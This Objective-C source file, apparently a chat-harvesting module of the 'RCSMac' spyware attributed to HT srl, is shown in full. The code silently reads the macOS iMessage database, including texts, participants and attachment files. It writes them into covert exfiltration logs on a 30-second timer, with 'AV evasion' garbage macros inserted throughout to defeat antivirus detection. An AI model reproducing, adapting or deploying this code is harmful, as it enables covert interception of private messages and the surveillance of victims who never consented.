/*
 * RCSMAgentChat.m
 * RCSMac
 * Chat Agent - based on iMessage history dump
 *
 *
 * Created by J on 01/12/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

#import "RCSMAgentChat.h"
#import "RCSMAgentOrganizer.h"
#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMAVGarbage.h"
#import <dlfcn.h>
#import <sqlite3.h>

#define MAX_FILE_SIZE  (25 *  1024 * 1024)

static BOOL gIMessageContactGrabbed = NO;

static __m_MAgentChat *sharedAgentChat = nil;

@interface __m_MAgentChat (private)


- (void) _writeLog:(NSMutableData*)logData;
- (void) _writeMMLog: (NSString*)filenameString withAdditionalHeader:(NSMutableData*)headerData;
- (void) _writeContactLog: (NSString *)contact;
- (void) _getMessageChatTimer:(NSTimer *)timer;
- (BOOL) _getMessageChat;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentChat (private)


- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 1];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}


- (void) _writeLog: (NSMutableData*)logData
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: AGENT_CHAT_NEW
                             agentHeader: nil
                               withLogID: 29];
    
    if (success)
    {
        
        [logManager writeDataToLog: logData
                          forAgent: AGENT_CHAT_NEW
                         withLogID: 29];
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [logManager closeActiveLog: AGENT_CHAT_NEW
                         withLogID: 29];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
    }
    
    [pool release];
    
    return;
}

- (void) _writeMMLog: (NSString*)filenameString withAdditionalHeader:(NSMutableData*)headerData
{
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
 
    unsigned long long fileSize = [[[NSFileManager defaultManager] attributesOfItemAtPath:filenameString error:nil] fileSize];

#ifdef DEBUG_CHAT
    infoLog(@"filesize: %llu",fileSize);
#endif

    if (fileSize > MAX_FILE_SIZE)
    {
        return;
    }
    
    NSMutableData *logData = [NSMutableData dataWithContentsOfFile:filenameString];
    if (logData != nil)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];

        BOOL success = [logManager createLog: LOG_MMCHAT
                                 agentHeader: headerData
                                   withLogID: 0];

        if (success)
        {
            [logManager writeDataToLog: logData
                              forAgent: LOG_MMCHAT
                             withLogID: 0];
            // AV evasion: only on release build
            AV_GARBAGE_001
        
            [logManager closeActiveLog: LOG_MMCHAT
                         withLogID: 0];
        
            // AV evasion: only on release build
            AV_GARBAGE_004
        }
    }

    [pool release];
    
    return;
}

- (void) _writeContactLog:(NSString *)contact
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    //NSData *firstData   = [@"Messages" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
    NSData *contactData = [contact dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
    
    NSMutableData *abData       = [[NSMutableData alloc] initWithCapacity:0];
    
    //u_int tag = 0x1 << 24; // firstName
    //tag |= ([firstData length] & 0x00FFFFFF);
    
    //[abData appendBytes:&tag length:sizeof(u_int)];
    //[abData appendData:firstData];

    u_int tag = 0x6 << 24; // email address
    tag |= ([contactData length] & 0x00FFFFFF);
    
    [abData appendBytes:&tag length:sizeof(u_int)];
    [abData appendData:contactData];
    
    NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    additionalHeader->size    = sizeof(organizerAdditionalHeader) + [abData length];
    additionalHeader->version = CONTACT_LOG_VERSION_NEW;
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    additionalHeader->identifier  = 0;
    additionalHeader->program     = 0x10; // Messages app contact
    additionalHeader->flags       = 0x80000000; // local
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSMutableData *entryData    = [[NSMutableData alloc] initWithCapacity:0];;
    
    [entryData appendData:logHeader];
    [entryData appendData:abData];
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: AGENT_ORGANIZER
                             agentHeader: nil
                               withLogID: 5];
    
    if (success)
    {
        [logManager writeDataToLog: entryData
                          forAgent: AGENT_ORGANIZER
                         withLogID: 5];
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [logManager closeActiveLog: AGENT_ORGANIZER
                         withLogID: 5];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
    }
  
    [logHeader release];
    [abData release];
    [entryData release];
    gIMessageContactGrabbed = YES;
}

- (void) _getMessageChatTimer: (NSTimer *)timer
{
    [self _getMessageChat];
}

- (BOOL) _getMessageChat
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    
    // usually Messages db is stored into ~/Library/Messages/chat.db
    NSString *homeDir = NSHomeDirectory();
    NSString *dbDir = [NSString stringWithFormat:@"%@/%@", homeDir, @"Library/Messages/chat.db"];
 
    sqlite3 *db = NULL;
    const char *dbDirUTF8 = [dbDir UTF8String];
    
    if (sqlite3_open(dbDirUTF8, &db))
    {
        sqlite3_close(db);
#ifdef DEBUG_CHAT
        infoLog(@"Unable to open db");
#endif
        [logData release];
        [pool release];
        return NO;
    }
 
    // retrieve markup and set date

    /*
    double markupDate;
    NSNumber *date = [markup objectForKey:MARKUP_KEY];
    if (date == nil)
    {
        markupDate = 1;
    }
    else
    {
        markupDate = [date doubleValue];
    } */

    // we use rowid into chat.db/message table
    int markupId;
    NSNumber *rowId = [markup objectForKey:MARKUP_KEY];
    if (rowId == nil)
    {
        markupId = 167; // TODO: restore this: 1;
    }
    else
    {
        markupId = [rowId intValue];
    }

    // recalculate markup
    /*
    NSDate *now = [NSDate date];
    NSTimeInterval seconds = [now timeIntervalSinceReferenceDate]; //typedef double NSTimeInterval
    date = [NSNumber numberWithDouble:seconds];
    [markup setObject:date forKey:MARKUP_KEY];
    */
    
    sqlite3_stmt *stmt = NULL;
    //char *query = "select message_id,chat_identifier,last_addressed_handle,display_name,text,date,is_from_me, handle_id,chat.ROWID from chat,chat_message_join,message where chat.ROWID=chat_id and message_id=message.ROWID and message.date >= ?";
    char *query = "select message_id,chat_identifier,last_addressed_handle,display_name,text,date,is_from_me, handle_id,chat.ROWID,message.ROWID from chat,chat_message_join,message where chat.ROWID=chat_id and message_id=message.ROWID and message.ROWID > ?";

    if(sqlite3_prepare_v2(db, query, strlen(query) + 1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_close(db);
#ifdef DEBUG_CHAT
        infoLog(@"Unable to prepare");
#endif
        [logData release];
        [pool release];
        return NO;
    }
    if(sqlite3_bind_double(stmt, 1, markupId) != SQLITE_OK)
    {
#ifdef DEBUG_PASSWORD
        infoLog(@"bind failed");
#endif
        sqlite3_close(db);
        [logData release];
        [pool release];
        return NO;
    }
    const unsigned char *chatId, *accountLogin, *displayName, *text;
    int isFromMe, handleId, chatRowId, msgId;
    double msgDate;
    double baseDate = 978307200;
    short unicodeNullTerminator = 0x0000;
    unsigned int delimiter = LOG_DELIMITER;
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        // msgDate from db it's a timestamp in seconds with base date January 1st, 2001.
        // baseDate timestamp (01.01.2001 00:00:00) is 978307200
        msgId = sqlite3_column_int(stmt,0);
        chatId = sqlite3_column_text(stmt,1);
        accountLogin = sqlite3_column_text(stmt,2);
        displayName = sqlite3_column_text(stmt,3);
        text = sqlite3_column_text(stmt,4);
        msgDate = sqlite3_column_double(stmt,5);
        isFromMe = sqlite3_column_int(stmt,6);
        handleId = sqlite3_column_int(stmt,7);
        chatRowId = sqlite3_column_int(stmt,8);
        
        markupId = sqlite3_column_int(stmt,9);
        NSNumber *rowIdNumber = [NSNumber numberWithInteger:markupId];
        [markup setObject:rowIdNumber forKey:MARKUP_KEY];
        
        // we check is_from_me flag
        // we have to select all participants to a chat (group chat or single chat)
        // if msg is from me (1), we write into peer all participants and into origin the account_login
        // if msg is not from me (0), we write into peer account_login and all participants except handle_id, and into origin the handle_id
        NSMutableString *peerString=[NSMutableString stringWithCapacity:0];
        const unsigned char *peer;
        NSString *originString;
        
        if (isFromMe ==1)
        {
            sqlite3_stmt *stmt3 = NULL;
            char *query3 = "select handle.id from chat_handle_join,handle where chat_id=? and handle_id=handle.ROWID";
            if(sqlite3_prepare_v2(db, query3, strlen(query3) + 1, &stmt3, NULL) != SQLITE_OK)
            {
                continue;
            }
            if(sqlite3_bind_int(stmt3, 1, chatRowId) != SQLITE_OK)
            {
                continue;
            }
            
            while(sqlite3_step(stmt3) == SQLITE_ROW)
            {
                peer = sqlite3_column_text(stmt3,0);
                NSString *tmpString = [NSString stringWithUTF8String:peer];
                [peerString appendString:tmpString];
                [peerString appendString:@","];
            }
            originString = [NSString stringWithUTF8String:accountLogin];

            sqlite3_finalize(stmt3);
            
            if (gIMessageContactGrabbed == NO)
            {
                [self _writeContactLog:originString];
#ifdef DEBUG_CHAT
                infoLog(@"write contact log");
#endif
            }
        }
        else
        {
            sqlite3_stmt *stmt3 = NULL;
            char *query3 = "select handle.id,handle_id from chat_handle_join,handle where chat_id=? and handle_id=handle.ROWID";
            if(sqlite3_prepare_v2(db, query3, strlen(query3) + 1, &stmt3, NULL) != SQLITE_OK)
            {
                continue;
            }
            if(sqlite3_bind_int(stmt3, 1, chatRowId) != SQLITE_OK)
            {
                continue;
            }
            
            while(sqlite3_step(stmt3) == SQLITE_ROW)
            {
                peer = sqlite3_column_text(stmt3,0);
                int peerId = sqlite3_column_int(stmt3, 1);

                if(peerId != handleId)
                {
                    NSString *tmpString = [NSString stringWithUTF8String:peer];
                    [peerString appendString:tmpString];
                    [peerString appendString:@","];
                }
            }
            [peerString appendString:[NSString stringWithUTF8String:accountLogin]];

            sqlite3_finalize(stmt3);
            
            sqlite3_stmt *stmt4 = NULL;
            char *query4 = "select handle.id from chat_handle_join,handle where chat_id=? and  handle_id=handle.ROWID and handle_id=?";
            if(sqlite3_prepare_v2(db, query4, strlen(query4) + 1, &stmt4, NULL) != SQLITE_OK)
            {
                continue;
            }
            if(sqlite3_bind_int(stmt4, 1, chatRowId) != SQLITE_OK)
            {
                continue;
            }
            if(sqlite3_bind_int(stmt4, 2, handleId) != SQLITE_OK)
            {
                continue;
            }
            while(sqlite3_step(stmt4) == SQLITE_ROW)
            {
                peer = sqlite3_column_text(stmt4,0);
                originString = [NSString stringWithUTF8String:peer];
            }

            sqlite3_finalize(stmt4);
        }
        
        // construct log
        // append timestamp
        time_t msgTime = (baseDate + msgDate);
        struct tm *tmTemp;
        tmTemp = gmtime(&msgTime);
        tmTemp->tm_year += 1900;
        tmTemp->tm_mon  ++;
        
        //
        // Our struct is 0x8 bytes bigger than the one declared on win32
        // this is just a quick fix
        // 0x14 bytes for 64bit processes
        //
        if (sizeof(long) == 4) // 32bit
        {
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            [logData appendBytes: (const void *)tmTemp
                            length: sizeof (struct tm) - 0x8];
        }
        else if (sizeof(long) == 8) // 64bit
        {
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            [logData appendBytes: (const void *)tmTemp
                            length: sizeof (struct tm) - 0x14];
        }

        // append program type
        int programType = 0x10; // type for iMessages
        [logData appendBytes:&programType length:sizeof(programType)];
        // append flags
        uint32 flags = ((isFromMe == 1)? 0 : 1);
        [logData appendBytes:&flags length:sizeof(flags)];
        
        NSString *textString = [NSString stringWithUTF8String:text];
        // append topic/sender
        [logData appendData:[originString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append sender display
        [logData appendData:[originString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append to
        [logData appendData:[peerString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append to display
        [logData appendData:[peerString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append content
        [logData appendData:[textString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
        [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
        // append delimiter
        [logData appendBytes: &delimiter length: sizeof(delimiter)];

#ifdef DEBUG_CHAT
        infoLog(@"textual, origin: %@", originString);
        infoLog(@"textual, peer: %@", peerString);
        infoLog(@"textual, isFromMe: %d",isFromMe);
        infoLog(@"textual, flags: %d", flags);
        infoLog(@"textual, text: %@",textString);
#endif

        // we have to log attachments too
        // attachments are saved as files and info about files are in chat.db
        // this is the easiest place in code to search, coz we have all the required info
        sqlite3_stmt *stmt5 = NULL;
        char *query5 = "select filename,transfer_name,mime_type from attachment,message_attachment_join where attachment_id=attachment.ROWID and message_id=?";
        if(sqlite3_prepare_v2(db, query5, strlen(query5) + 1, &stmt5, NULL) != SQLITE_OK)
        {
            continue;
        }
        if(sqlite3_bind_int(stmt5, 1, msgId) != SQLITE_OK)
        {
            continue;
        }
        while(sqlite3_step(stmt5) == SQLITE_ROW)
        {
            const unsigned char *filename= sqlite3_column_text(stmt5,0);
            NSString *relativePath = [NSString stringWithUTF8String:filename]; // this is a path starting with ~/
            NSString *filenameString = [relativePath stringByStandardizingPath];
            const unsigned char *transfername= sqlite3_column_text(stmt5,1);
            NSString *transfernameString = [NSString stringWithUTF8String:transfername];
            const unsigned char *mime_type= sqlite3_column_text(stmt5,2);
            NSString *mimeString = [NSString stringWithUTF8String:mime_type];
#ifdef DEBUG_CHAT
            infoLog(@"mm, origin: %@", originString);
            infoLog(@"mm, peer: %@", peerString);
            infoLog(@"mm, transfer name: %@",transfernameString);
            infoLog(@"mm, filename: %@",filenameString);
            infoLog(@"mm, mime type: %@",mimeString);
            infoLog(@"mm, msgId: %d",msgId);
            infoLog(@"mm, isFromMe: %d",isFromMe);
#endif
            NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
            if (sizeof(long) == 4) // 32bit
            {
                // AV evasion: only on release build
                AV_GARBAGE_008
                
                [additionalHeader appendBytes: (const void *)tmTemp
                              length: sizeof (struct tm) - 0x8];
            }
            else if (sizeof(long) == 8) // 64bit
            {
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [additionalHeader appendBytes: (const void *)tmTemp
                              length: sizeof (struct tm) - 0x14];
            }
            
            // append program type
            [additionalHeader appendBytes:&programType length:sizeof(programType)];
            // append flags
            uint32 flags = ((isFromMe == 1)? 0 : 1);
            [additionalHeader appendBytes:&flags length:sizeof(flags)];
            
            // append topic/sender
            [additionalHeader appendData:[originString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // append sender display
            [additionalHeader appendData:[originString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // append to
            [additionalHeader appendData:[peerString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // append to display
            [additionalHeader appendData:[peerString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // append mime type
            [additionalHeader appendData:[mimeString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // append filename, can be absolute or relative path
            [additionalHeader appendData:[transfernameString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
            [additionalHeader appendBytes:&unicodeNullTerminator length:sizeof(short)];
            // write to log
            [self _writeMMLog:filenameString withAdditionalHeader:additionalHeader];
            
            [additionalHeader release];
        }
        sqlite3_finalize(stmt5);
        // end log attachments
    }

    if ([logData length] >0)
    {
        [self _writeLog:logData];
    }
    [self _setMarkup];
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    [logData release];
    [pool release];
    return YES;
}

@end


@implementation __m_MAgentChat

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentChat *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentChat == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentChat;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentChat == nil)
        {
            sharedAgentChat = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentChat;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
#ifdef DEBUG_CHAT
    infoLog(@"chat module stopped");
#endif
    
    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
#ifdef DEBUG_CHAT
    infoLog(@"chat module started");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    [self _getMarkup];
    
    //first run
    [self _getMessageChat];
  
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
    
    
    NSTimer *timer = nil;
    timer = [NSTimer scheduledTimerWithTimeInterval: 30 target:self selector:@selector(_getMessageChatTimer:) userInfo:nil repeats:YES];
    [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
    
    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 6)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    if (timer != nil)
    {
        [timer invalidate];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002

    [outerPool release];
}


- (BOOL)resume
{
#ifdef DEBUG_CHAT
    infoLog(@"chat module resumed");
#endif
    
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
